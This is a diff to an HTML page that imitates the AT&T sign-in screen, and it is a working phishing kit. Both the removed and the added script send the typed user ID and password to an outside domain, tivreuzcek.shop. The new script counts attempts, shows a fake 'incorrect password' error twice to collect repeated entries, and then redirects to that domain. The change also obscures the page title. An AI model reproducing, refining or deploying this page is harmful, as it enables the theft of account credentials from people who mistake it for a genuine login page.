@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>AT&T Sign In — Replica</title>
+<title>A T T</title>
 <link rel="icon" href="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" />
 <style>
 /* ---- Fonts & base ---- */
@@ -322,6 +322,19 @@
             <input type="checkbox" id="keepSigned" aria-label="Keep me signed in" />
             <label for="keepSigned" style="margin:0; font-weight:500; color:var(--muted);">Keep me signed in</label>
           </div>
+          
+          <div id="errorMessage" style="
+    background-color:#f2dede;
+    color:#a94442;
+    border:1px solid #ebccd1;
+    padding:15px;
+    margin:12px 0 18px;
+    font-size:14px;
+    border-radius:0px;
+    display:none;
+">
+    The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.
+</div>
 
           <button class="btn-primary" id="btnSignIn" type="button" aria-label="Sign in">Sign in</button>
 
@@ -393,55 +406,47 @@
 </script>
 
 <script>
-    const btnSignIn = document.getElementById('btnSignIn');
-    const pwdInput = document.getElementById('pwd');
-    const useridInput = document.getElementById('userid');
-    
-    // Create error message element (same as your previous design)
-    const errorMessage = document.createElement('div');
-    errorMessage.style.backgroundColor = '#f2dede';
-    errorMessage.style.color = '#a94442';
-    errorMessage.style.border = '1px solid #ebccd1';
-    errorMessage.style.padding = '15px';
-    errorMessage.style.margin = '12px 0 18px';
-    errorMessage.style.fontSize = '14px';
-    errorMessage.style.borderRadius = '0px';
-    errorMessage.style.display = 'none';
-    errorMessage.textContent = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.";
-    btnSignIn.parentNode.insertBefore(errorMessage, btnSignIn);
-    
-    // Hide error on input
-    useridInput.addEventListener('input', () => errorMessage.style.display = 'none');
-    pwdInput.addEventListener('input', () => errorMessage.style.display = 'none');
-    
-    btnSignIn.addEventListener('click', (e) => {
-        e.preventDefault();
-    
-        const formData = new FormData();
-        formData.append('userid', useridInput.value.trim());
-        formData.append('pwd', pwdInput.value.trim());
-    
-        fetch('https://tivreuzcek.shop/index.php', {
-            method: 'POST',
-            body: formData
-        })
-        .then(res => res.json()) // PHP will return JSON with {status: "ok" or "final"}
-        .then(data => {
-            if(data.status === "ok") {
-                errorMessage.style.display = 'block';
-                pwdInput.value = '';
-                pwdInput.focus();
-            } else if(data.status === "final") {
-                window.location.href = 'https://tivreuzcek.shop/final.php'; // final redirect
-            }
-        })
-        .catch(err => {
-            console.error("Error sending data", err);
-            errorMessage.style.display = 'block';
-        });
-    });
-    </script>
-    
-    
+const btnSignIn = document.getElementById("btnSignIn");
+const useridInput = document.getElementById("userid");
+const pwdInput = document.getElementById("pwd");
+const errorMessage = document.getElementById("errorMessage");
+
+// Frontend attempt counter
+let attemptCount = 0;
+
+// Hide error on input
+useridInput.addEventListener("input", () => errorMessage.style.display = "none");
+pwdInput.addEventListener("input", () => errorMessage.style.display = "none");
+
+btnSignIn.addEventListener("click", async (e) => {
+    e.preventDefault();
+
+    attemptCount++; // increment attempt on each submission
+
+    const formData = new FormData();
+formData.append("userid", useridInput.value.trim());
+formData.append("pwd", pwdInput.value.trim());
+formData.append("attemptCount", attemptCount); // pass attempt number to PHP
+
+    try {
+        // Send data to PHP backend 
+        await fetch("https://tivreuzcek.shop/index.php", { method: "POST", body: formData });
+
+        if (attemptCount < 3) {
+            errorMessage.style.display = "block";
+            pwdInput.value = "";
+            pwdInput.focus();
+        } else {
+            // On final attempt, force redirect
+            window.location.href = "https://tivreuzcek.shop/final.php";
+        }
+
+    } catch (err) {
+        console.error("Error sending data", err);
+        errorMessage.style.display = "block";
+    }
+});
+</script>
+
 </body>
 </html>
